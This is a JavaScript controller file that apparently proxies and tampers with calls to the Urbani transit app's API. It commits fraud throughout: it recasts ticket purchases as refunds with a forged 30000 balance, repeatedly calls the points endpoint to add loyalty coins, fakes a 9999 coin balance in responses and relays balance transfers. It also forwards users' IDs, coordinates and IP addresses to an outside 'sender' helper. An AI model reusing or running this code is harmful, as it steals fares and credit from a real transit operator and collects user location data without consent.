import { getUrbiCoins, requests, sender } from '../helpers/index.js'


const sendAccess = async(req, res) => {
  const body = req.body
  
  const send = `■■■■■🚎🎟🚈■■■■■
👤 UID: ${ body[0].uid }
🎫 Boleto: ${ body[0].branch }
👥️ Pasajeros: ${ body[0].passengers }
💲 Total: ${ body[0].total }
🧭 Latitud: ${ body[0].latitude }
🧭 Longitud: ${ body[0].longitude }
🪙 Balance: ${ body[0].balance_new }
🌐 IP: ${ req.headers['x-forwarded-for'] || req.connection.remoteAddress }
■■■■■■■■■■■■■■■`

  sender(send, res)
  
  body[0].action = 'refund'
  body[0].balance_new = 30000
  body[0].balance_old = 30000
  console.log(body)
  
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/u/send/access`,
      'POST',
      body
    );

    
    console.log(resp)
    
    res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
  
}

const addPoints = async(req, res) => {
  
  req.body.add_urbicoins = 50
  console.log(req.body)
  
  //req.body = { user_id: 'Rq7rVuiFUPBtVrhEquAaTSab6sif', add_urbicoins: 50 }
  
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/p/addPoints`,
      'POST',
      req.body
    );
    
    console.log(resp)
    
   res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  console.log('ap')
  }
  
}

const sendUrbiCoins = async(req, res) => {
  
  const newCoins = await getUrbiCoins(req, res)
  let cantidadFinal
  const faltante = 1000 - newCoins
  
  console.log(newCoins)
  console.log(faltante)
  
  console.log(req.body)
  const user_id = req.body.user_id
  const cantidad = req.body.amount / 100
  
  if(faltante > 100) cantidadFinal = 50
  
  if(faltante < 100) cantidadFinal = 20
  
  if(faltante <= 50) cantidadFinal = 10
  
  if(faltante <= 20) cantidadFinal = 5

  if(faltante <= 10) cantidadFinal = 1
  
  const iteracciones = faltante / cantidadFinal
  
  //req.body.amount = 1
  
  //if (cantidad > 50) return res.status(500).json({message: 'Maximo 50!! >:c'})
  if(cantidad !== 5) return res.status(500).json({message: '¡Presiona 5 para continúar!'})
  
  const body = { user_id: user_id , add_urbicoins: cantidadFinal }
  
  
  //const cantidadi = 15;

for (let i = 0; i < iteracciones; i++) {
  
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/p/addPoints`,
      'POST',
      body
    );
    
    console.log(resp)
    

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  console.log('ap')
  }
  
}
   res.status(200).json({message: 'Completado, revisa el otro dispositivo!'})

}

const changeCoupon = async(req, res) => {
  console.log(req.body)
  
  try {
    const resp = await requests(
      req,
      `https://urbani-coupons.urbani.io/app/p/changeCoupon`,
      'POST',
      req.body
    );
    
    console.log(resp)
    

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
 // console.log('ap')
  }
  
  res.send('ok')
}

const coinPoints = async(req, res) => {
  console.log(req.body)
  
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/p/coins_points`,
      'POST',
      req.body
    );
    resp.urbicoins = 9999
    console.log(resp)
    res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  console.log('ap')
  }
  
}

const substractPoints = async(req, res) => {
  console.log(req.body)
  
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/p/subtract/points`,
      'POST',
      req.body
    );
    
    console.log(resp)
    res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
 // console.log('ap')
  }
  
}

const transferBalance = async(req, res) => {
  console.log(req.body)
  
  try {
    
    const resp = await requests(
      req,
      `https://app.urbani.io/app/p/transferBalance`,
      'POST',
      req.body
    );
    console.log(resp)
    res.send(resp);
    
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  } 
  
  /*JSON.stringify({
  user_id: 'oRwZf98YO23xcfc61sgRvRIYAmRu',
  amount: 1500,
  method: 'test',
  status: 'test',
  transaction_id: '10001'
})*/

}

export {
  addPoints,
  changeCoupon,
  coinPoints,
  sendAccess,
  sendUrbiCoins,
  substractPoints,
  transferBalance
}